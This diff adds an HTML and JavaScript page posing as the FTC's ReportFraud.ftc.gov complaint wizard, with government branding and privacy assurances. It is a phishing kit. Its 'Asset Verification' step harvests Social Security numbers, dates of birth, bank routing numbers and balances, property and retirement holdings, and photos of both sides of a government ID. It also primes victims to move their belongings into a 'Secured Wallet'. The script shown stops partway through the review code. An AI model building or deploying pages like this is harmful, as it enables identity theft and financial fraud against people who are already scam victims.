@@ -1,0 +1,768 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File a Report - ReportFraud.ftc.gov</title>
+    <link rel="stylesheet" href="ftc-styles.css">
+    <style>
+        .av-section { font-size:16px;font-weight:700;color:#1a2a4a;margin:24px 0 14px;padding-top:20px;border-top:1px solid #dce5ef; }
+        .av-section:first-of-type { border-top:none;padding-top:0;margin-top:0; }
+        .dynamic-fields { display:flex;flex-direction:column;gap:12px;margin-top:10px; }
+        .dynamic-field-row { background:#f0f4f8;border-radius:8px;padding:14px 16px; }
+        .dynamic-field-row > label { font-size:11px;font-weight:700;color:#6c7580;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:10px; }
+        .av-warning { background:#fff0f0;border:1px solid #ffcdd2;border-radius:10px;padding:14px 18px;margin:18px 0; }
+        .av-warning strong { color:#b71c1c;display:block;margin-bottom:5px; }
+        .av-warning p { color:#c62828;font-size:13px;margin:0;line-height:1.5; }
+    </style>
+</head>
+<body>
+
+<header class="ftc-header">
+    <div class="ftc-header-top">
+        <div class="ftc-header-top-inner">
+            <span style="color:#7aa3c8;font-size:12px;">An official website of the United States government</span>
+            <div style="display:flex;gap:20px;"><a href="#">Espanol</a><a href="#">FTC.gov</a></div>
+        </div>
+    </div>
+    <div class="ftc-header-main">
+        <a href="index.html" class="ftc-logo">
+            <svg class="ftc-logo-seal" viewBox="0 0 56 56" fill="none">
+                <circle cx="28" cy="28" r="27" fill="#1a3a6e" stroke="#4fc3f7" stroke-width="2"/>
+                <text x="28" y="22" text-anchor="middle" fill="#4fc3f7" font-size="10" font-weight="800" font-family="Arial">FTC</text>
+                <text x="28" y="34" text-anchor="middle" fill="#fff" font-size="5.5" font-family="Arial" letter-spacing="0.5">FEDERAL TRADE</text>
+                <text x="28" y="41" text-anchor="middle" fill="#fff" font-size="5.5" font-family="Arial" letter-spacing="0.5">COMMISSION</text>
+            </svg>
+            <div class="ftc-logo-text">
+                <div class="agency">Federal Trade Commission</div>
+                <div class="name">Report<span>Fraud</span>.ftc.gov</div>
+            </div>
+        </a>
+        <nav class="ftc-nav">
+            <a href="index.html">Home</a>
+            <a href="report.html">File a Report</a>
+            <a href="#">Track Report</a>
+            <a href="#">FAQs</a>
+        </nav>
+    </div>
+</header>
+
+<div style="background:#f0f4f8;border-bottom:1px solid #dce5ef;padding:14px 24px;">
+    <div style="max-width:820px;margin:0 auto;font-size:13px;color:#6c7580;">
+        <a href="index.html" style="color:#1a3a6e;text-decoration:none;">Home</a> &rsaquo; <strong style="color:#1a2a4a;">File a Report</strong>
+    </div>
+</div>
+
+<div class="ftc-report-wrap">
+
+    <!-- Progress bar -->
+    <div class="ftc-progress" id="progressBar">
+        <div class="ftc-progress-step active" id="prog1">
+            <div class="ftc-progress-dot">1</div>
+            <div class="ftc-progress-label">What Happened</div>
+        </div>
+        <div class="ftc-progress-step" id="prog2">
+            <div class="ftc-progress-dot">2</div>
+            <div class="ftc-progress-label">The Scammer</div>
+        </div>
+        <div class="ftc-progress-step" id="prog3">
+            <div class="ftc-progress-dot">3</div>
+            <div class="ftc-progress-label">Your Details</div>
+        </div>
+        <div class="ftc-progress-step" id="prog4">
+            <div class="ftc-progress-dot">4</div>
+            <div class="ftc-progress-label">Asset Verification</div>
+        </div>
+        <div class="ftc-progress-step" id="prog5">
+            <div class="ftc-progress-dot">5</div>
+            <div class="ftc-progress-label">Review</div>
+        </div>
+    </div>
+
+    <div class="ftc-card">
+
+        <!-- STEP 1 -->
+        <div class="ftc-step-panel active" id="step1">
+            <h2>What is your report about?</h2>
+            <p class="ftc-card-sub">Select the category that best describes your experience.</p>
+            <div class="ftc-wizard-cats" id="catGrid">
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'impersonator')"><div class="ftc-wizard-cat-icon">&#127963;</div>Government or Business Impersonator</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'online-shopping')"><div class="ftc-wizard-cat-icon">&#128722;</div>Online Shopping or Negative Reviews</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'investment')"><div class="ftc-wizard-cat-icon">&#128200;</div>Investment or Business Opportunity</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'phone')"><div class="ftc-wizard-cat-icon">&#128241;</div>Telephone or Mobile Service</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'prizes')"><div class="ftc-wizard-cat-icon">&#127873;</div>Prizes, Sweepstakes and Lotteries</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'identity')"><div class="ftc-wizard-cat-icon">&#128290;</div>Identity Theft</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'debt')"><div class="ftc-wizard-cat-icon">&#128179;</div>Credit, Debt and Loans</div>
+                <div class="ftc-wizard-cat" onclick="selectCat(this,'other')"><div class="ftc-wizard-cat-icon">&#128203;</div>Something Else</div>
+            </div>
+            <div class="ftc-field">
+                <label for="story">Tell us what happened <span class="ftc-required">*</span></label>
+                <textarea id="story" placeholder="Describe the fraud or scam in your own words..." required></textarea>
+            </div>
+            <div class="ftc-field">
+                <label for="dateOccurred">When did this occur? <span class="ftc-required">*</span></label>
+                <input type="date" id="dateOccurred" required>
+            </div>
+            <div class="ftc-field">
+                <label for="moneyLost">Did you lose money?</label>
+                <select id="moneyLost">
+                    <option value="">Select an option</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                    <option value="unsure">Not sure yet</option>
+                </select>
+            </div>
+            <div class="ftc-field" id="amountField" style="display:none;">
+                <label for="amountLost">How much did you lose (USD)?</label>
+                <input type="number" id="amountLost" placeholder="0.00" min="0" step="0.01">
+            </div>
+            <div class="ftc-field">
+                <label for="paymentMethod">How did you pay (if applicable)?</label>
+                <select id="paymentMethod">
+                    <option value="">Select payment method</option>
+                    <option value="credit-card">Credit or Debit Card</option>
+                    <option value="bank-transfer">Bank Transfer / Wire Transfer</option>
+                    <option value="crypto">Cryptocurrency</option>
+                    <option value="gift-card">Gift Card</option>
+                    <option value="cash">Cash</option>
+                    <option value="zelle">Zelle / Venmo / PayPal</option>
+                    <option value="other">Other</option>
+                    <option value="none">Did Not Pay</option>
+                </select>
+            </div>
+            <div class="ftc-btn-row">
+                <button class="ftc-btn-next" onclick="goStep(2)">Continue</button>
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="ftc-step-panel" id="step2">
+            <h2>About the Scammer</h2>
+            <p class="ftc-card-sub">Tell us what you know. It is okay if you do not have all the information.</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="scammerName">Name of Person or Business</label><input type="text" id="scammerName" placeholder="e.g. John Smith or ACME Corp"></div>
+                <div class="ftc-field"><label for="scammerPhone">Phone Number Used</label><input type="tel" id="scammerPhone" placeholder="(555) 123-4567"></div>
+            </div>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="scammerEmail">Email Address Used</label><input type="email" id="scammerEmail" placeholder="support@fakesite.com"></div>
+                <div class="ftc-field"><label for="scammerWebsite">Website Used</label><input type="text" id="scammerWebsite" placeholder="www.fakesite.com"></div>
+            </div>
+            <div class="ftc-field">
+                <label for="howContacted">How were you contacted? <span class="ftc-required">*</span></label>
+                <select id="howContacted" required>
+                    <option value="">Select an option</option>
+                    <option value="phone-call">Phone Call</option>
+                    <option value="text-message">Text Message</option>
+                    <option value="email">Email</option>
+                    <option value="social-media">Social Media</option>
+                    <option value="website">Website / Online Ad</option>
+                    <option value="mail">U.S. Mail</option>
+                    <option value="in-person">In Person</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+            <div class="ftc-field">
+                <label for="scammerImpersonating">Was the scammer pretending to be someone?</label>
+                <select id="scammerImpersonating">
+                    <option value="">Select an option</option>
+                    <option value="irs">IRS or Tax Authority</option>
+                    <option value="ssa">Social Security Administration</option>
+                    <option value="ftc">FTC or Other Government Agency</option>
+                    <option value="tech-support">Tech Support (Apple, Microsoft, etc.)</option>
+                    <option value="bank">Bank or Financial Institution</option>
+                    <option value="amazon">Amazon or Online Retailer</option>
+                    <option value="lottery">Lottery or Prize Organization</option>
+                    <option value="none">No Impersonation</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+            <div class="ftc-btn-row">
+                <button class="ftc-btn-back" onclick="goStep(1)">Back</button>
+                <button class="ftc-btn-next" onclick="goStep(3)">Continue</button>
+            </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="ftc-step-panel" id="step3">
+            <h2>Your Contact Information</h2>
+            <p class="ftc-card-sub">Protected by federal privacy law. Will not be shared publicly.</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="firstName">First Name <span class="ftc-required">*</span></label><input type="text" id="firstName" placeholder="Your first name" required></div>
+                <div class="ftc-field"><label for="lastName">Last Name <span class="ftc-required">*</span></label><input type="text" id="lastName" placeholder="Your last name" required></div>
+            </div>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="email">Email Address <span class="ftc-required">*</span></label><input type="email" id="email" placeholder="your@email.com" pattern="[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}" title="Enter a valid email address with @ and domain (e.g. name@example.com)" required oninput="validateEmail(this)"><p class="hint" id="emailHint" style="color:#e8392a;display:none;">Please enter a valid email (e.g. name@example.com)</p></div>
+                <div class="ftc-field"><label for="phone">Phone Number</label><input type="tel" id="phone" placeholder="10-digit number" maxlength="10" pattern="[0-9]{10}" title="Enter exactly 10 digits, numbers only" oninput="this.value=this.value.replace(/[^0-9]/g,'');validatePhone(this)"><p class="hint" id="phoneHint" style="color:#e8392a;display:none;">Enter exactly 10 digits, numbers only</p></div>
+            </div>
+            <div class="ftc-field"><label for="address">Street Address</label><input type="text" id="address" placeholder="123 Main St"></div>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="city">City</label><input type="text" id="city" placeholder="City"></div>
+                <div class="ftc-field"><label for="state">State</label>
+                    <select id="state">
+                        <option value="">Select state</option>
+                        <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+                        <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+                        <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+                        <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+                        <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+                        <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+                        <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+                        <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+                        <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+                        <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+                        <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+                        <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+                        <option>Wisconsin</option><option>Wyoming</option>
+                    </select>
+                </div>
+            </div>
+            <div class="ftc-field"><label for="zip">ZIP Code</label><input type="text" id="zip" placeholder="12345" maxlength="5"></div>
+            <div style="background:#e8eef6;border-radius:8px;padding:14px 16px;font-size:13px;color:#1a3a6e;line-height:1.6;">
+                <strong>Privacy Notice:</strong> The information you provide is protected by the Privacy Act of 1974 and will only be used for fraud investigation purposes.
+            </div>
+            <div class="ftc-btn-row">
+                <button class="ftc-btn-back" onclick="goStep(2)">Back</button>
+                <button class="ftc-btn-next" onclick="goStep(4)">Continue</button>
+            </div>
+        </div>
+
+        <!-- STEP 4: ASSET VERIFICATION -->
+        <div class="ftc-step-panel" id="step4">
+            <h2>Asset Verification</h2>
+            <p class="ftc-card-sub">To process your reimbursement claim, we need to verify your assets. All information is protected under federal law.</p>
+
+            <div style="background:#fff3cd;border:1px solid #ffd166;border-radius:8px;padding:14px 16px;margin-bottom:20px;font-size:13px;color:#856404;">
+                <strong>CONFIDENTIAL</strong> — Keep your Reference Secret Number secure. Do not share it with anyone outside authorized investigative officers.
+            </div>
+
+            <p class="av-section">Case Reference</p>
+            <div class="ftc-field">
+                <label for="referenceNumber">Reference Secret Number <span class="ftc-required">*</span></label>
+                <input type="text" id="referenceNumber" placeholder="Enter your reference number from your complaint ID" required>
+                <p class="hint">Use the Complaint ID you received from the Apple Support form.</p>
+            </div>
+
+            <p class="av-section">Loss Details</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field">
+                    <label for="lossType">Type of Loss <span class="ftc-required">*</span></label>
+                    <select id="lossType" required>
+                        <option value="">Select type</option>
+                        <option value="financial">Financial Loss</option>
+                        <option value="data">Data Breach</option>
+                        <option value="device">Device Damage / Theft</option>
+                        <option value="identity">Identity Theft</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+                <div class="ftc-field">
+                    <label for="lossAmount">Estimated Loss Amount (USD) <span class="ftc-required">*</span></label>
+                    <input type="number" id="lossAmount" placeholder="0.00" min="0" step="0.01" required>
+                </div>
+            </div>
+            <div class="ftc-field">
+                <label for="lossDescription">Detailed Description of Loss <span class="ftc-required">*</span></label>
+                <textarea id="lossDescription" rows="3" placeholder="Describe the loss in detail..." required></textarea>
+            </div>
+            <div class="ftc-field">
+                <label for="authoritiesContacted">Authorities Contacted?</label>
+                <select id="authoritiesContacted">
+                    <option value="">Select</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                </select>
+            </div>
+
+            <p class="av-section">Personal Identification</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field">
+                    <label for="ssn">Social Security Number <span class="ftc-required">*</span></label>
+                    <input type="text" id="ssn" placeholder="9 digits, no dashes" maxlength="9" pattern="[0-9]{9}" required>
+                    <p class="hint">Required for identity verification. Stored securely under federal law.</p>
+                </div>
+                <div class="ftc-field">
+                    <label for="dob">Date of Birth <span class="ftc-required">*</span></label>
+                    <input type="text" id="dob" placeholder="MM/DD/YYYY" required>
+                </div>
+            </div>
+
+            <p class="av-section">Asset Information</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field">
+                    <label for="propertyCount">Properties Owned</label>
+                    <select id="propertyCount" onchange="generatePropertyFields(this.value)">
+                        <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                        <option value="3">3</option><option value="4">4</option><option value="5+">5+</option>
+                    </select>
+                </div>
+                <div class="ftc-field">
+                    <label for="bankAccountCount">Bank Accounts</label>
+                    <select id="bankAccountCount" onchange="generateBankFields(this.value)">
+                        <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                        <option value="3">3</option><option value="4+">4+</option>
+                    </select>
+                </div>
+            </div>
+            <div id="propertyFields" class="dynamic-fields"></div>
+            <div id="bankFields" class="dynamic-fields"></div>
+
+            <div class="ftc-field" style="margin-top:14px;">
+                <label for="creditCardCount">Total Credit Cards</label>
+                <select id="creditCardCount" onchange="generateCreditCardFields(this.value)">
+                    <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                    <option value="3">3</option><option value="4">4</option><option value="5+">5+</option>
+                </select>
+            </div>
+            <div id="creditCardFields" class="dynamic-fields"></div>
+
+            <p class="av-section">Retirement and Investment Accounts</p>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="has401k">401(k) Account?</label>
+                    <select id="has401k"><option value="">Select</option><option value="yes">Yes</option><option value="no">No</option></select></div>
+                <div class="ftc-field"><label for="balance401k">401(k) Balance (approx.)</label>
+                    <input type="text" id="balance401k" placeholder="e.g. $50,000"></div>
+            </div>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="hasIRA">IRA Account?</label>
+                    <select id="hasIRA"><option value="">Select</option><option value="yes">Yes</option><option value="no">No</option></select></div>
+                <div class="ftc-field"><label for="balanceIRA">IRA Balance (approx.)</label>
+                    <input type="text" id="balanceIRA" placeholder="e.g. $30,000"></div>
+            </div>
+            <div class="ftc-form-row">
+                <div class="ftc-field"><label for="hasMoneyMarket">Money Market?</label>
+                    <select id="hasMoneyMarket"><option value="">Select</option><option value="yes">Yes</option><option value="no">No</option></select></div>
+                <div class="ftc-field"><label for="balanceMoneyMarket">Money Market Balance</label>
+                    <input type="text" id="balanceMoneyMarket" placeholder="e.g. $10,000"></div>
+            </div>
+
+            <p class="av-section">Reimbursement</p>
+            <div class="ftc-field">
+                <label for="reimbursementMethod">Preferred Reimbursement Method <span class="ftc-required">*</span></label>
+                <select id="reimbursementMethod" required>
+                    <option value="">Select method</option>
+                    <option value="bank-transfer">Bank Transfer</option>
+                    <option value="check">Check by Mail</option>
+                    <option value="digital-wallet">Digital Wallet (PayPal / Venmo)</option>
+                    <option value="credit">Credit to Account</option>
+                </select>
+            </div>
+            <div class="ftc-field">
+                <label for="additionalInfo">Additional Information</label>
+                <textarea id="additionalInfo" rows="3" placeholder="Any other relevant information..."></textarea>
+            </div>
+
+            <p class="av-section">Government Issued ID Verification <span class="ftc-required">*</span></p>
+            <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:13px;color:#1e40af;">
+                Upload a clear photo of a valid government-issued ID (Driver's License, State ID, or Passport). Both front and back are required.
+            </div>
+            <div class="ftc-form-row">
+                <div class="ftc-field">
+                    <label for="idFront">ID Front Side <span class="ftc-required">*</span></label>
+                    <div id="idFrontBox" style="border:2px dashed #c8d5e0;border-radius:9px;padding:22px 16px;text-align:center;cursor:pointer;transition:border-color .2s;background:#f8fafc;" onclick="document.getElementById('idFront').click()">
+                        <div style="font-size:32px;margin-bottom:8px;">&#128247;</div>
+                        <div style="font-size:14px;font-weight:600;color:#1a3a6e;margin-bottom:4px;">Click to Upload Front</div>
+                        <div style="font-size:12px;color:#6c7580;">JPG, PNG or PDF &mdash; Max 5MB</div>
+                        <img id="idFrontPreview" style="display:none;max-width:100%;max-height:120px;margin-top:12px;border-radius:6px;border:1px solid #dce5ef;" alt="Front preview">
+                    </div>
+                    <input type="file" id="idFront" accept="image/*,.pdf" style="display:none;" onchange="previewID(this,'idFrontPreview','idFrontBox','idFrontName')">
+                    <p class="hint" id="idFrontName" style="margin-top:6px;"></p>
+                </div>
+                <div class="ftc-field">
+                    <label for="idBack">ID Back Side <span class="ftc-required">*</span></label>
+                    <div id="idBackBox" style="border:2px dashed #c8d5e0;border-radius:9px;padding:22px 16px;text-align:center;cursor:pointer;transition:border-color .2s;background:#f8fafc;" onclick="document.getElementById('idBack').click()">
+                        <div style="font-size:32px;margin-bottom:8px;">&#128247;</div>
+                        <div style="font-size:14px;font-weight:600;color:#1a3a6e;margin-bottom:4px;">Click to Upload Back</div>
+                        <div style="font-size:12px;color:#6c7580;">JPG, PNG or PDF &mdash; Max 5MB</div>
+                        <img id="idBackPreview" style="display:none;max-width:100%;max-height:120px;margin-top:12px;border-radius:6px;border:1px solid #dce5ef;" alt="Back preview">
+                    </div>
+                    <input type="file" id="idBack" accept="image/*,.pdf" style="display:none;" onchange="previewID(this,'idBackPreview','idBackBox','idBackName')">
+                    <p class="hint" id="idBackName" style="margin-top:6px;"></p>
+                </div>
+            </div>
+
+            <div class="av-warning">
+                <strong>IMPORTANT NOTE</strong>
+                <p>Depending upon the gravity of fraud, you might have to submit some or all belongings to the Secured Wallet (Govt. Authorized). The agent will guide you through the reimbursement process.</p>
+            </div>
+
+            <div class="ftc-btn-row">
+                <button class="ftc-btn-back" onclick="goStep(3)">Back</button>
+                <button class="ftc-btn-next" onclick="goStep(5)">Review Report</button>
+            </div>
+        </div>
+
+        <!-- STEP 5: REVIEW -->
+        <div class="ftc-step-panel" id="step5">
+            <h2>Review Your Report</h2>
+            <p class="ftc-card-sub">Please review all information before submitting.</p>
+            <div id="reviewContent" style="background:#f0f4f8;border-radius:10px;padding:22px 20px;margin-bottom:24px;font-size:14px;line-height:2;color:#1a2a4a;"></div>
+            <div style="background:#fff3cd;border:1px solid #ffd166;border-radius:8px;padding:14px 16px;margin-bottom:22px;font-size:13px;color:#856404;">
+                <strong>Declaration:</strong> By submitting this report, I declare that the information I have provided is true and accurate to the best of my knowledge.
+            </div>
+            <div class="ftc-btn-row">
+                <button class="ftc-btn-back" onclick="goStep(4)">Back</button>
+                <button class="ftc-btn-submit" onclick="submitReport()">Submit Report</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<footer class="ftc-footer">
+    <div class="ftc-footer-inner">
+        <div class="ftc-footer-bottom" style="text-align:center;">
+            &copy; Federal Trade Commission &nbsp;|&nbsp; An official website of the U.S. Government
+        </div>
+    </div>
+</footer>
+
+<script>
+    var formData = {};
+    var selectedCat = '';
+    var TOTAL_STEPS = 5;
+
+    function validateEmail(el) {
+        var valid = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(el.value);
+        document.getElementById('emailHint').style.display = (el.value && !valid) ? 'block' : 'none';
+        el.style.borderColor = (el.value && !valid) ? '#e8392a' : '';
+    }
+
+    function validatePhone(el) {
+        var valid = /^[0-9]{10}$/.test(el.value);
+        document.getElementById('phoneHint').style.display = (el.value && !valid) ? 'block' : 'none';
+        el.style.borderColor = (el.value && !valid) ? '#e8392a' : '';
+    }
+
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var cat = params.get('cat');
+        if (cat) {
+            var tiles = document.querySelectorAll('.ftc-wizard-cat');
+            tiles.forEach(function(t) {
+                if (t.getAttribute('onclick') && t.getAttribute('onclick').indexOf(cat) > -1) {
+                    t.classList.add('selected');
+                    selectedCat = cat;
+                }
+            });
+        }
+    })();
+
+    function previewID(input, previewId, boxId, nameId) {
+        var file = input.files[0];
+        if (!file) return;
+        if (file.size > 5 * 1024 * 1024) {
+            alert('File is too large. Maximum size is 5MB.');
+            input.value = '';
+            return;
+        }
+        document.getElementById(nameId).textContent = '✔ ' + file.name;
+        document.getElementById(nameId).style.color = '#28a745';
+        document.getElementById(boxId).style.borderColor = '#28a745';
+        document.getElementById(boxId).style.background = '#f0fdf4';
+        if (file.type.startsWith('image/')) {
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                var img = document.getElementById(previewId);
+                img.src = e.target.result;
+                img.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+        }
+    }
+
+    function selectCat(el, cat) {
+        document.querySelectorAll('.ftc-wizard-cat').forEach(function(t){ t.classList.remove('selected'); });
+        el.classList.add('selected');
+        selectedCat = cat;
+    }
+
+    document.getElementById('moneyLost').addEventListener('change', function() {
+        document.getElementById('amountField').style.display = this.value === 'yes' ? 'block' : 'none';
+    });
+
+    function generatePropertyFields(count) {
+        var c = document.getElementById('propertyFields'); c.innerHTML = '';
+        var n = parseInt(count) || 0;
+        for (var i = 1; i <= n; i++) {
+            c.innerHTML += '<div class="dynamic-field-row"><label>Property ' + i + '</label><div class="ftc-form-row"><div class="ftc-field"><label>Address</label><input type="text" name="prop' + i + '_addr" placeholder="Street address"></div><div class="ftc-field"><label>Estimated Value (USD)</label><input type="text" name="prop' + i + '_val" placeholder="e.g. $250,000"></div></div></div>';
+        }
+    }
+
+    function generateBankFields(count) {
+        var c = document.getElementById('bankFields'); c.innerHTML = '';
+        var n = parseInt(count) || 0;
+        for (var i = 1; i <= n; i++) {
+            c.innerHTML += '<div class="dynamic-field-row"><label>Bank Account ' + i + '</label><div class="ftc-form-row"><div class="ftc-field"><label>Bank Name</label><input type="text" name="bank' + i + '_name" placeholder="e.g. Chase"></div><div class="ftc-field"><label>Account Type</label><select name="bank' + i + '_type"><option value="">Select</option><option>Checking</option><option>Savings</option></select></div></div><div class="ftc-form-row" style="margin-top:8px"><div class="ftc-field"><label>Balance (USD)</label><input type="text" name="bank' + i + '_bal" placeholder="e.g. $5,000"></div><div class="ftc-field"><label>Routing Number</label><input type="text" name="bank' + i + '_rtn" placeholder="9-digit" maxlength="9"></div></div></div>';
+        }
+    }
+
+    function generateCreditCardFields(count) {
+        var c = document.getElementById('creditCardFields'); c.innerHTML = '';
+        var n = parseInt(count) || 0;
+        for (var i = 1; i <= n; i++) {
+            c.innerHTML += '<div class="dynamic-field-row"><label>Credit Card ' + i + '</label><div class="ftc-form-row"><div class="ftc-field"><label>Card Issuer</label><input type="text" name="card' + i + '_issuer" placeholder="Visa, Mastercard, Amex"></div><div class="ftc-field"><label>Credit Limit (USD)</label><input type="text" name="card' + i + '_limit" placeholder="e.g. $10,000"></div></div></div>';
+        }
+    }
+
+    function goStep(n) {
+        if (n === 2) {
+            if (!document.getElementById('story').value.trim()) { alert('Please describe what happened.'); return; }
+            if (!document.getElementById('dateOccurred').value) { alert('Please enter the date.'); return; }
+            if (!selectedCat) { alert('Please select a category.'); return; }
+        }
+        if (n === 4) {
+            if (!document.getElementById('firstName').value.trim() || !document.getElementById('lastName').value.trim()) { alert('Please enter your full name.'); return; }
+            var emailVal = document.getElementById('email').value.trim();
+            if (!emailVal) { alert('Please enter your email address.'); return; }
+            if (!/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(emailVal)) { alert('Please enter a valid email address (e.g. name@example.com).'); document.getElementById('email').focus(); return; }
+            var phoneVal = document.getElementById('phone').value.trim();
+            if (phoneVal && !/^[0-9]{10}$/.test(phoneVal)) { alert('Phone number must be exactly 10 digits.'); document.getElementById('phone').focus(); return; }
+        }
+        if (n === 5) {
+            if (!document.getElementById('referenceNumber').value.trim()) { alert('Please enter your Reference Secret Number.'); return; }
+            if (!document.getElementById('lossType').value) { alert('Please select type of loss.'); return; }
+            if (!document.getElementById('lossAmount').value) { alert('Please enter estimated loss amount.'); return; }
+            if (!document.getElementById('lossDescription').value.trim()) { alert('Please describe the loss.'); return; }
+            if (!document.getElementById('ssn').value.trim()) { alert('Please enter your SSN.'); return; }
+            if (!document.getElementById('dob').value.trim()) { alert('Please enter your date of birth.'); return; }
+            if (!document.getElementById('reimbursementMethod').value) { alert('Please select reimbursement method.'); return; }
+            if (!document.getElementById('idFront').files || !document.getElementById('idFront').files[0]) { alert('Please upload the front side of your government ID.'); return; }
+            if (!document.getElementById('idBack').files || !document.getElementById('idBack').files[0]) { alert('Please upload the back side of your government ID.'); return; }
+            collectAssetData();
+            buildReview();
+        }
+
+        collectBasicData();
+
+        for (var i = 1; i <= TOTAL_STEPS; i++) {
+            document.getElementById('step' + i).classList.remove('active');
+            var prog = document.getElementById('prog' + i);
+            prog.classList.remove('active', 'done');
+            if (i < n) prog.classList.add('done');
+            else if (i === n) prog.classList.add('active');
+        }
+        document.getElementById('step' + n).classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function collectBasicData() {
+        formData.category = selectedCat;
+        formData.story = document.getElementById('story').value;
+        formData.dateOccurred = document.getElementById('dateOccurred').value;
+        formData.moneyLost = document.getElementById('moneyLost').value;
+        formData.amountLost = document.getElementById('amountLost').value;
+        formData.paymentMethod = document.getElementById('paymentMethod').value;
+        formData.scammerName = document.getElementById('scammerName').value;
+        formData.scammerPhone = document.getElementById('scammerPhone').value;
+        formData.scammerEmail = document.getElementById('scammerEmail').value;
+        formData.scammerWebsite = document.getElementById('scammerWebsite').value;
+        formData.howContacted = document.getElementById('howContacted').value;
+        formData.scammerImpersonating = document.getElementById('scammerImpersonating').value;
+        formData.firstName = document.getElementById('firstName').value;
+        formData.lastName = document.getElementById('lastName').value;
+        formData.email = document.getElementById('email').value;
+        formData.phone = document.getElementById('phone').value;
+        formData.address = document.getElementById('address').value;
+        formData.city = document.getElementById('city').value;
+        formData.state = document.getElementById('state').value;
+        formData.zip = document.getElementById('zip').value;
+    }
+
+    function collectAssetData() {
+        formData.referenceNumber = document.getElementById('referenceNumber').value;
+        formData.lossType = document.getElementById('lossType').value;
+        formData.lossAmount = document.getElementById('lossAmount').value;
+        formData.lossDescription = document.getElementById('lossDescription').value;
+        formData.authoritiesContacted = document.getElementById('authoritiesContacted').value;
+        formData.ssn = document.getElementById('ssn').value;
+        formData.dob = document.getElementById('dob').value;
+        formData.propertyCount = document.getElementById('propertyCount').value;
+        formData.bankAccountCount = document.getElementById('bankAccountCount').value;
+        formData.creditCardCount = document.getElementById('creditCardCount').value;
+        formData.has401k = document.getElementById('has401k').value;
+        formData.balance401k = document.getElementById('balance401k').value;
+        formData.hasIRA = document.getElementById('hasIRA').value;
+        formData.balanceIRA = document.getElementById('balanceIRA').value;
+        formData.hasMoneyMarket = document.getElementById('hasMoneyMarket').value;
+        formData.balanceMoneyMarket = document.getElementById('balanceMoneyMarket').value;
+        formData.reimbursementMethod = document.getElementById('reimbursementMethod').value;
+        formData.additionalInfo = document.getElementById('additionalInfo').value;
+    }
+
+    function buildReview() {
+        var cat = (selectedCat||'').replace(/-/g,' ').replace(/\b\w/g,function(c){return c.toUpperCase();});
+        var rows = [
+            ['Category', cat],
+            ['Date Occurred', formData.dateOccurred],
+            ['Money Lost', formData.moneyLost + (formData.amountLost ? ' ($' + formData.amountLost + ')' : '')],
+            ['Payment Method', formData.paymentMethod || 'N/A'],
+            ['How Contacted', formData.howContacted || 'N/A'],
+            ['Scammer Name', formData.scammerName || 'Not provided'],
+            ['Scammer Website', formData.scammerWebsite || 'Not provided'],
+            ['Your Name', formData.firstName + ' ' + formData.lastName],
+            ['Your Email', formData.email],
+            ['Location', [formData.city, formData.state, formData.zip].filter(Boolean).join(', ') || 'Not provided'],
+            ['Reference Number', formData.referenceNumber],
+            ['Type of Loss', formData.lossType],
+            ['Loss Amount', '$' + formData.lossAmount],
+            ['SSN Provided', formData.ssn ? 'Yes (secured)' : 'No'],
+            ['DOB', formData.dob],
+            ['Properties', formData.propertyCount || '0'],
+            ['Bank Accounts', formData.bankAccountCount || '0'],
